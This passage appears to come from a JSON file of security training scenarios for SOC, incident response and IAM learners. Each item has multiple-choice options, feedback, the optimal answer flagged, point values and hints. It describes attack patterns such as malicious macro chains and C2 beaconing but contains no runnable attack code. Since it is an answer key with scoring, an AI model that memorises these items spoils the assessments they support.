            "text": "What metric directly proves you can recover within requirements?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Validated RTO from actual failover tests proves recovery capability. Tested, not assumed."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Resilience Program Sustainability",
        "situation": "You've designed a comprehensive resilience architecture. Patricia asks how to ensure this doesn't become 'shelfware' - documented but not maintained, like the previous DR plan.\n\n**Question:** What is MOST important for resilience program sustainability?",
        "options": [
          {
            "id": "A",
            "text": "Annual third-party audit of DR capabilities",
            "feedback": "{'short': 'Annual audit is too infrequent and external', 'detailed': \"Annual audits provide point-in-time validation but: things change throughout the year, audits don't build internal capability, and findings come months after issues develop. Continuous internal ownership is more effective than periodic external review.\", 'consequence': 'Gaps may exist for months before annual audit finds them.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Integrated change management - every change assessed for resilience impact",
            "feedback": "{'short': 'Correct! Resilience built into ongoing operations', 'detailed': 'Integrating resilience into change management ensures: every new system evaluated for DR requirements, every change assessed for recovery impact, DR documentation updated when systems change, and recovery testing included in deployment. Resilience becomes part of how IT operates, not a separate program that atrophies.', 'consequence': 'Resilience maintained as environment evolves. Not a one-time project.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Dedicated DR team responsible for all recovery planning",
            "feedback": "{'short': \"Siloed team doesn't scale and creates single point of knowledge\", 'detailed': \"Dedicated DR team creates: dependency on specific people, disconnect from system owners who understand changes, and 'not my job' mentality from other IT staff. Resilience should be everyone's responsibility, integrated into normal IT operations, not siloed.\", 'consequence': 'Knowledge concentrated in small team. Not integrated with daily operations.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Quarterly executive reporting on resilience metrics",
            "feedback": "{'short': 'Reporting creates visibility but not action', 'detailed': \"Executive reporting is valuable for awareness and accountability, but it's an output, not a driver of sustainability. Without operational integration (change management, testing, continuous improvement), there's nothing meaningful to report. Metrics without integrated process just measure decline.\", 'consequence': \"Reports show status but don't drive ongoing maintenance.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you ensure resilience stays current as the environment changes?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Integrate resilience into change management: every change assessed for DR impact, documentation updated, testing included. Resilience becomes part of operations, not separate."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D4-REM-001",
    "title": "Log Analysis Fundamentals",
    "domain": 4,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": "20-25 minutes",
    "role": "Junior SOC Analyst in training",
    "organization": {
      "name": "Security Organization",
      "industry": "SOC analyst training - learning to analyze security logs"
    },
    "introduction": "Welcome to Log Analysis Fundamentals. You will make critical security decisions.",
    "learning_objectives": [
      "Explain security alerting and monitoring concepts and tools",
      "Given a scenario, use data sources to support an investigation"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Log Type Selection",
        "situation": "You're investigating a potential unauthorized access. A user claims their account was compromised and someone accessed company files. You need to find evidence of the unauthorized access.\n\n**Question:** Which log type is MOST important for investigating unauthorized account access?",
        "options": [
          {
            "id": "A",
            "text": "Firewall logs - to see network connections",
            "feedback": "{'short': 'Firewall logs show network traffic but not account usage', 'detailed': 'Firewall logs show what IPs connected but not which account was used or what they accessed. For account compromise, you need to see authentication events and access patterns tied to the user account.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Authentication logs - to see login activity for the account",
            "feedback": "{'short': 'Correct! Authentication logs show account usage patterns', 'detailed': \"Authentication logs show: when the account logged in, from where (source IP), success/failure, and what systems were accessed. This directly answers 'was the account used by someone other than the owner?' Look for logins from unusual locations or times.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Application logs - to see what applications were used",
            "feedback": "{'short': 'Application logs are useful but authentication comes first', 'detailed': 'Application logs might show what the attacker did once logged in, but you first need to establish that unauthorized access occurred. Start with authentication to prove the compromise, then use application logs to understand the impact.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "System logs - to see system events",
            "feedback": "{'short': 'System logs have limited visibility into account usage', 'detailed': 'System logs show system-level events but have limited information about user authentication and access patterns. Authentication logs are purpose-built for tracking account usage.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "The investigation is about account access. What log type tracks account logins?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Authentication logs (Active Directory, VPN) show login times, source IPs, and success/failure for each account."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "SIEM Alert Interpretation",
        "situation": "Your SIEM generates an alert: 'Brute Force Detected - Account: jsmith - 47 failed logins in 3 minutes from IP 185.220.101.X followed by successful login.'\n\n**Question:** What does this SIEM alert indicate?",
        "options": [
          {
            "id": "A",
            "text": "A user forgot their password and tried multiple times",
            "feedback": "{'short': '47 attempts in 3 minutes is too fast for manual typing', 'detailed': 'A human typing passwords wrong would take much longer than 47 attempts in 3 minutes. This pace indicates automated attack tools. Additionally, the external IP (185.220.101.X is a Tor exit node pattern) suggests external attacker, not the legitimate user.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Likely credential stuffing or brute force attack that succeeded",
            "feedback": "{'short': 'Correct! High-speed attempts from external IP + success = account compromised', 'detailed': 'This pattern indicates: automated attack (speed of attempts), external source (suspicious IP), and success (attacker found valid credentials). The account is likely compromised. Immediate actions: disable the account, investigate what the attacker accessed, determine if credentials were reused elsewhere.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "A false positive - failed logins happen all the time",
            "feedback": "{'short': 'The pattern strongly indicates an attack', 'detailed': \"Individual failed logins might be benign, but SIEM correlation identified the pattern: 47 failures in 3 minutes followed by success. This is the signature of a successful brute force attack. The SIEM's value is detecting these patterns.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "A misconfigured application trying to authenticate",
            "feedback": "{'short': 'Misconfigured apps usually fail consistently, not succeed after many failures', 'detailed': \"Misconfigured applications typically either succeed or fail consistently with the same wrong password. They don't try 47 different passwords and then succeed - that's password guessing behavior.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "The key details: many failed attempts, very fast, then success. What attack does this describe?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Brute force/credential stuffing: automated tools try many passwords quickly. Success after many failures = attacker found valid credentials."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Windows Event Analysis",
        "situation": "You're reviewing Windows Security logs and see this sequence on a workstation:\n- 4624 (Logon) - User: SYSTEM\n- 4688 (Process Create) - powershell.exe spawned by winword.exe\n- 4688 (Process Create) - cmd.exe spawned by powershell.exe\n\n**Question:** What does this log sequence indicate?",
        "options": [
          {
            "id": "A",
            "text": "Normal Office activity - Word can use PowerShell for macros",
            "feedback": "{'short': 'Word spawning PowerShell is a major red flag', 'detailed': 'While technically possible, Word spawning PowerShell is the classic pattern for malicious macro execution. Legitimate Office macros rarely need PowerShell, and the chain Word \u00e2\u2020\u2019 PowerShell \u00e2\u2020\u2019 cmd is a common attack pattern. This should be investigated immediately.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Likely malicious macro execution - classic attack pattern",
            "feedback": "{'short': 'Correct! This is a textbook malware execution chain', 'detailed': 'This process tree (Word \u00e2\u2020\u2019 PowerShell \u00e2\u2020\u2019 cmd) is the signature of malicious macro execution: user opens malicious document, macro runs PowerShell for flexibility/evasion, PowerShell spawns cmd or downloads additional malware. This pattern should trigger immediate investigation and potential endpoint isolation.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "System maintenance task running",
            "feedback": "{'short': \"System tasks don't run through Word\", 'detailed': 'System maintenance tasks would be spawned by system processes or scheduled tasks, not by Microsoft Word. The process parent (winword.exe) is the critical indicator here.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "User running a legitimate script from a document",
            "feedback": "{'short': 'This pattern is malicious until proven otherwise', 'detailed': 'Even if a user intentionally ran a macro, Word spawning PowerShell spawning cmd is the exact pattern malware uses. Legitimate business processes rarely require this chain. Investigate as suspicious regardless of user intent.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Look at the process parent-child relationship. What spawned PowerShell?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Office applications (Word, Excel) spawning command-line tools (PowerShell, cmd) is the signature of malicious macro execution."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Network IOC Detection",
        "situation": "DNS logs show a workstation making queries every 60 seconds to: xk7qm2.suspicious-domain.xyz. The domain was registered yesterday and resolves to an IP in Eastern Europe.\n\n**Question:** What does this DNS activity indicate?",
        "options": [
          {
            "id": "A",
            "text": "Normal web browsing activity",
            "feedback": "{'short': \"Normal browsing doesn't query the same domain every 60 seconds\", 'detailed': 'Web browsing creates varied DNS queries as users visit different sites. Regular intervals to the same domain indicate automated behavior, not human browsing. The suspicious domain characteristics add to concern.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Likely Command and Control (C2) beaconing",
            "feedback": "{'short': 'Correct! Regular intervals + suspicious domain = C2 beaconing', 'detailed': 'C2 beaconing indicators: regular interval timing (every 60 seconds = automated), suspicious domain (random-looking subdomain, newly registered), unusual destination (Eastern Europe IP), and persistent connections. The malware is checking in with its controller. Investigate the workstation immediately.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Software update check",
            "feedback": "{'short': 'Legitimate update services use recognizable domains', 'detailed': 'Software update services use well-known domains (microsoft.com, adobe.com) not random-looking subdomains on newly registered domains. The domain characteristics indicate malicious infrastructure, not legitimate software.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "CDN caching activity",
            "feedback": "{'short': 'CDNs use established, recognizable domains', 'detailed': 'CDN providers (Cloudflare, Akamai, etc.) use established domains. A random subdomain on a day-old domain is not CDN infrastructure. The domain age and name pattern indicate attacker infrastructure.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What does regular-interval DNS queries to a suspicious domain suggest?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "C2 beaconing: malware checks in with its command server at regular intervals. Look for: fixed timing, suspicious domains (random names, newly registered), unusual destinations."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Log Correlation Challenge",
        "situation": "You have three events from different logs around the same time:\n1. VPN log: Successful login for admin account from unusual country\n2. AD log: Admin account added to Domain Admins group\n3. EDR log: PsExec.exe executed on domain controller\n\n**Question:** What does correlating these three events reveal?",
        "options": [
          {
            "id": "A",
            "text": "Routine administrative activity",
            "feedback": "{'short': 'The unusual country login makes this suspicious', 'detailed': 'Each event alone might be normal, but: VPN from unusual country (suspicious), followed by privilege escalation (adding to Domain Admins), followed by lateral movement tool (PsExec on DC) is an attack chain. Correlating events reveals the full attack.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Active attack - credential compromise, privilege escalation, lateral movement",
            "feedback": "{'short': 'Correct! Correlation reveals the attack chain', 'detailed': \"Correlating these events shows: Initial Access (VPN login from unusual location = compromised credentials), Privilege Escalation (added to Domain Admins = attacker elevating), and Lateral Movement (PsExec on DC = attacker spreading). This is an active attack requiring immediate response. Each event alone might be missed; together they're clearly malicious.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Software deployment activity",
            "feedback": "{'short': \"Software deployment doesn't require adding accounts to Domain Admins\", 'detailed': 'Legitimate software deployment would use existing service accounts with appropriate permissions, not: login from unusual country, add to Domain Admins, then use PsExec. The sequence shows an attacker building access.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "VPN connectivity test",
            "feedback": "{'short': \"VPN tests don't involve privilege escalation and DC access\", 'detailed': \"A VPN test would be a login and perhaps basic connectivity verification. It wouldn't involve modifying group memberships or executing tools on domain controllers. The full sequence is clearly malicious.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Look at the sequence: access from unusual location \u00e2\u2020\u2019 privilege change \u00e2\u2020\u2019 tool execution. What's happening?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Attack chain: Initial Access (VPN compromise) \u00e2\u2020\u2019 Privilege Escalation (Domain Admin) \u00e2\u2020\u2019 Lateral Movement (PsExec). Correlation connects the dots."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 125,
    "passing_score": 75
  },
  {
    "id": "D4-REM-002",
    "title": "Incident Response Basics",
    "domain": 4,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": "20-25 minutes",
    "role": "Junior incident responder in training",
    "organization": {
      "name": "Security Organization",
      "industry": "Incident response training - learning IR fundamentals"
    },
    "introduction": "Welcome to Incident Response Basics. You will make critical security decisions.",
    "learning_objectives": [
      "Explain appropriate incident response activities",
      "Given a scenario, use data sources to support an investigation"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Active Incident Response",
        "situation": "You receive an alert: ransomware is actively encrypting files on a server. The encryption started 10 minutes ago and is spreading. You can see files being encrypted in real-time.\n\n**Question:** What should be your FIRST action?",
        "options": [
          {
            "id": "A",
            "text": "Begin forensic imaging of the server",
            "feedback": "{'short': 'Forensics can wait - the attack is active', 'detailed': 'While evidence is important, forensic imaging takes hours. During that time, more files are being encrypted. Stop the active damage first, then collect evidence. The server is creating its own logs of the encryption that will be available after containment.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Isolate the server from the network immediately",
            "feedback": "{'short': 'Correct! Stop the spread, then investigate', 'detailed': \"With active encryption, the priority is stopping further damage. Network isolation: stops ransomware from spreading to other systems, may stop encryption if it requires C2 communication, and preserves the server's state for investigation. You'll still have the encrypted files, memory, and logs after isolation.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Call a team meeting to discuss response options",
            "feedback": "{'short': 'No time for meetings during active attack', 'detailed': 'Every minute of meeting is more files encrypted. Active attacks require immediate action. Isolate first to stop damage, then coordinate. You can discuss next steps after immediate containment.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Shut down the server completely",
            "feedback": "{'short': 'Stops encryption but loses volatile evidence', 'detailed': 'Shutdown stops the ransomware but: loses memory contents (might contain encryption keys), loses running process information, and may corrupt partially encrypted files. Network isolation stops spread while preserving more evidence.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "The attack is active and spreading. What stops the spread while preserving the most evidence?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Network isolation: stops lateral spread, keeps server running (preserves memory/processes), allows investigation of contained system."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Evidence Collection Priority",
        "situation": "After containing the ransomware, you need to collect evidence. The server is isolated but still running. You have limited time before you need to begin recovery.\n\n**Question:** What evidence should you collect FIRST?",
        "options": [
          {
            "id": "A",
            "text": "Memory dump - capture RAM contents",
            "feedback": "{'short': 'Correct! Memory is most volatile - collect first', 'detailed': \"Memory contents are lost on reboot or shutdown. Memory may contain: the running malware, encryption keys (possibly allowing decryption), network connections, and attacker commands. Disk contents will persist - memory won't. Order of volatility: most volatile first.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Disk image - copy the entire hard drive",
            "feedback": "{'short': 'Important but disk is persistent - memory is more urgent', 'detailed': 'Disk imaging is important but disk contents persist. Memory is lost on power-off. Collect memory first, then disk image. You might even find encryption keys in memory that help recovery.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Ransom note screenshot - document the demand",
            "feedback": "{'short': \"The ransom note is a file on disk - it won't disappear\", 'detailed': \"The ransom note is saved to disk and will be there when you image the drive. It's not volatile evidence. Memory contents, which may contain crucial forensic data, should come first.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Network logs from the firewall",
            "feedback": "{'short': 'Important but firewall logs are typically retained', 'detailed': \"Firewall logs are stored centrally and usually have retention periods. They're less volatile than the server's memory. Collect from the compromised server first, then gather supporting logs from network devices.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Order of volatility - what evidence disappears first?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Memory (RAM) is most volatile - lost on power off. May contain: running malware, encryption keys, attacker commands, network connections."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Containment Decision",
        "situation": "During investigation, you discover the attacker used a compromised user account (jsmith) to access the server. The account has legitimate access to multiple systems. The attacker may still have the credentials.\n\n**Question:** What is the MOST appropriate containment action for the compromised account?",
        "options": [
          {
            "id": "A",
            "text": "Monitor the account to see what else the attacker accesses",
            "feedback": "{'short': 'Too risky - attacker can cause more damage', 'detailed': \"While observing attacker activity can provide intelligence, the attacker has already deployed ransomware. Continued access risks additional damage. The investigation value doesn't outweigh the damage risk in this case.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Disable the account and reset the password immediately",
            "feedback": "{'short': \"Correct! Remove attacker's access immediately\", 'detailed': 'Disabling the account: immediately prevents the attacker from using it again, is fast and reversible (low impact if wrong), and is the standard containment for compromised credentials. Reset the password too in case attacker tries to re-enable. Inform jsmith separately about the incident.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Email the user to change their password",
            "feedback": "{'short': 'Too slow and attacker might intercept', 'detailed': 'Asking the user to change their password: takes time (user might not see email immediately), attacker might intercept the email, and user might choose a weak password. Security team should force the credential change.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Wait until after the investigation to change anything",
            "feedback": "{'short': 'Leaves attacker with access during investigation', 'detailed': 'Investigation can take days or weeks. Leaving the attacker with valid credentials during that time is unacceptable risk. Contain the credential compromise immediately; you can still investigate how it was compromised.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "The attacker has working credentials. What removes their access fastest?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Disable account + reset password = attacker loses access immediately. Fast, reversible, standard response to credential compromise."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Escalation and Communication",
        "situation": "The ransomware has encrypted critical business data including customer financial records. Your initial assessment suggests customer data was likely accessed. It's 2 AM and you're the only responder currently engaged.\n\n**Question:** Who should you notify FIRST?",
        "options": [
          {
            "id": "A",
            "text": "Customers whose data may be affected",
            "feedback": "{'short': 'Too early and requires legal guidance', 'detailed': \"Customer notification is important but: you don't yet know the full scope, notification requirements have legal implications, and premature notification can cause unnecessary panic. Legal counsel should guide customer notification timing and content.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Your incident response lead/manager for escalation",
            "feedback": "{'short': 'Correct! Escalate to get appropriate resources and authority', 'detailed': \"Escalate to your IR lead: they can activate additional responders, have authority to make containment decisions, know who else needs to be notified (legal, executives), and can coordinate the broader response. Don't try to handle a major incident alone - escalate to get help.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "The FBI to report the ransomware",
            "feedback": "{'short': 'Important but internal escalation comes first', 'detailed': \"Law enforcement notification is valuable but: your organization should decide through proper channels when to involve them, legal counsel may want to guide that conversation, and the FBI won't help with immediate containment. Internal escalation first.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "No one until morning - avoid waking people at 2 AM",
            "feedback": "{'short': 'Major incidents require immediate escalation', 'detailed': \"Customer data breach + ransomware is a major incident requiring immediate executive awareness and potentially regulatory notification. Waiting until morning delays critical decisions and may violate notification requirements. Wake people up - that's what IR plans are for.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "This is a major incident. Who has authority to coordinate response and make decisions?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Escalate to IR lead/management: they activate resources, have decision authority, and know notification requirements. Don't handle major incidents alone."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Post-Incident Activity",
        "situation": "The incident is resolved - systems are restored, credentials reset, and monitoring is enhanced. Management asks what the team should do next to prevent recurrence.\n\n**Question:** What is the MOST important post-incident activity?",
        "options": [
          {
            "id": "A",
            "text": "Identify and terminate the employee who clicked the phishing link",
            "feedback": "{'short': 'Blame-focused approach prevents learning', 'detailed': \"Focusing on blaming individuals: discourages reporting of security issues, doesn't address systemic problems (why did phishing succeed?), and creates a culture of fear. The question is 'why did our controls fail?' not 'who do we blame?'\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Conduct a blameless lessons learned review and implement improvements",
            "feedback": "{'short': 'Correct! Learn from incidents to prevent recurrence', 'detailed': \"Lessons learned review: document what happened (timeline, actions taken), identify what worked and what didn't (detection, response, communication), find systemic improvements (better controls, training, procedures), assign owners and track improvements, and share lessons (without blame). This turns a negative event into security improvement.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Move on - the incident is over",
            "feedback": "{'short': 'Misses the learning opportunity', 'detailed': \"Without lessons learned, you'll repeat mistakes. The same vulnerability, gap, or process failure that enabled this incident may enable the next one. Every incident is a learning opportunity - don't waste it.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Purchase more security tools",
            "feedback": "{'short': \"Tools aren't always the answer\", 'detailed': 'The failure may have been process, training, or configuration - not lack of tools. Lessons learned should identify what actually failed. Sometimes tools are the answer, but that determination comes from analysis, not assumption.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What IR phase focuses on learning and preventing recurrence?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Lessons learned: blameless review of what happened, what worked, what didn't, and what improvements are needed. Turn incidents into security improvements."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 125,
    "passing_score": 75
  },
  {
    "id": "D4-REM-003",
    "title": "IAM Concepts",
    "domain": 4,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": "20-25 minutes",
    "role": "IT professional learning IAM concepts",
    "organization": {
      "name": "Security Organization",
      "industry": "IAM fundamentals training - learning identity and access management"
    },
    "introduction": "Welcome to IAM Concepts. You will make critical security decisions.",
    "learning_objectives": [
      "Given a scenario, implement and maintain identity and access management",
      "Explain the purpose of mitigation techniques used to secure the enterprise"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Deprovisioning Priority",
        "situation": "An employee was terminated this morning for cause. They're upset and have already left the building. HR informs you about the termination via email.\n\n**Question:** What is the MOST urgent action regarding this user's access?",
        "options": [
          {
            "id": "A",
            "text": "Schedule account deletion for next week's maintenance window",
            "feedback": "{'short': 'Far too slow for a hostile termination', 'detailed': 'A terminated employee who is upset poses immediate risk. Waiting until next week gives them days to access systems and potentially cause damage or steal data. Deprovisioning must be immediate.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Disable all accounts and revoke access immediately",
            "feedback": "{'short': 'Correct! Immediate deprovisioning for terminated users', 'detailed': 'Immediate actions: disable AD account (prevents new logins), revoke VPN access, disable email, revoke application access. The user left upset - they may try to access systems remotely. Every minute of delay is risk. This should be automated when possible.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Wait for the standard HR termination process to complete",
            "feedback": "{'short': 'Standard process is too slow for security risk', 'detailed': 'Standard HR processes might take days. For a hostile termination, security needs override standard timelines. IT should have an expedited process for immediate deprovisioning when security risk exists.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Just change their password - they can keep the account for reference",
            "feedback": "{'short': 'Password change alone is insufficient', 'detailed': \"Password change doesn't revoke existing sessions, doesn't disable email, doesn't revoke application access, and doesn't prevent them from resetting password if they have access to password reset. Full account disable is required.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "A terminated employee who is upset = security risk. How quickly should access be removed?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Immediate deprovisioning: disable account, revoke all access, terminate sessions. Don't wait for standard processes when there's security risk."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "MFA Configuration",
        "situation": "You're implementing MFA for remote access. Users currently authenticate with username and password only. You need to add a second factor.\n\n**Question:** Which MFA configuration provides the STRONGEST security improvement?",
        "options": [
          {
            "id": "A",
            "text": "Add a second password that users must also enter",
            "feedback": "{'short': 'Two passwords are not MFA', 'detailed': \"Two passwords are both 'something you know' - the same factor type. MFA requires different factor types. Two passwords can both be phished, stolen, or guessed. This provides minimal security improvement.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Add SMS text message codes as second factor",
            "feedback": "{'short': 'Better than nothing but SMS has weaknesses', 'detailed': \"SMS is a true second factor (something you have - the phone), but: SMS can be intercepted via SIM swapping attacks, SMS can be redirected by attackers, and cell networks have vulnerabilities. It's better than password-only but not the strongest option.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Add authenticator app (TOTP) codes as second factor",
            "feedback": "{'short': 'Correct! Authenticator apps are more secure than SMS', 'detailed': \"Authenticator apps (Google Authenticator, Microsoft Authenticator): generate codes on the device (not transmitted via SMS), can't be intercepted via SIM swap, work offline, and are a true 'something you have' factor. This is the standard recommendation for most MFA implementations.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Add security questions as second factor",
            "feedback": "{'short': \"Security questions are 'something you know' - same as password\", 'detailed': 'Security questions are knowledge-based - the same factor type as password. Answers can often be researched on social media or guessed. This is not true MFA and provides minimal additional security.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "MFA requires different factor types. Password is 'something you know.' What's a different factor type?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "'Something you have' - authenticator app on your phone generates codes. More secure than SMS because codes aren't transmitted over vulnerable networks."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Privileged Account Management",
        "situation": "The IT team shares one administrator account with the password written on a sticky note on the server room wall. When something breaks, any available admin logs in and fixes it.\n\n**Question:** What is the PRIMARY security problem with this approach?",
        "options": [
          {
            "id": "A",
            "text": "The sticky note could fall off the wall",
            "feedback": "{'short': 'Physical security is a problem, but not the primary one', 'detailed': 'The sticky note is bad, but even if the password were memorized, shared admin accounts are a fundamental security problem. The password visibility is a symptom, not the root cause.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "No accountability - impossible to know who did what",
            "feedback": "{'short': 'Correct! Shared accounts eliminate individual accountability', 'detailed': \"With shared accounts: no audit trail of individual actions (logs show 'admin' did it, not who), no accountability for mistakes or malicious actions, impossible to investigate incidents, and violates compliance requirements. Each admin should have their own admin account with their activity logged.\"}",
            "is_optimal": true,
